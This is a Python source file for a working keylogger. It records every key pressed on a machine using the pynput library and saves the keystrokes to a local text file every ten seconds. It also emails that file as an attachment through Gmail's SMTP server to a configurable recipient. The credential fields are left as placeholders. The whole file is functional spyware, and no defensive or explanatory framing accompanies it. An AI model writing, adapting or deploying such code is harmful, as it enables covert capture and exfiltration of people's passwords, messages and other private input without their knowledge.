from pynput import keyboard
import threading
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

log_file_path = "keystrokes.txt"
keystrokes = []


smtp_server = "smtp.gmail.com" 
smtp_port = 587 
smtp_username = "Your_Email"
smtp_password = "Your App_Password To generate the App_Password please read out the read me file"
email_from = "Your Email"
email_to = "Receipent Email"
email_subject = "Keystroke Log"

def on_press(key):
    try:
        keystrokes.append(f"Key stroke: {key.char}\n")
    except AttributeError:
        keystrokes.append(f"Special stroke: {key}\n")

def save_keystrokes():
    while True:
        time.sleep(10) 
        if keystrokes:
            with open(log_file_path, "a") as file:
                file.write("".join(keystrokes))
            keystrokes.clear()
            send_email()

def send_email():
    msg = MIMEMultipart()
    msg['From'] = email_from
    msg['To'] = email_to
    msg['Subject'] = email_subject

    body = "Please find the keystroke log attached."
    msg.attach(MIMEText(body, 'plain'))

    
    with open(log_file_path, "rb") as attachment:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f"attachment; filename={log_file_path}")
        msg.attach(part)

    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(smtp_username, smtp_password)
    text = msg.as_string()
    server.sendmail(email_from, email_to, text)
    server.quit()
    

def main():
    save_thread = threading.Thread(target=save_keystrokes, daemon=True)
    save_thread.start()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
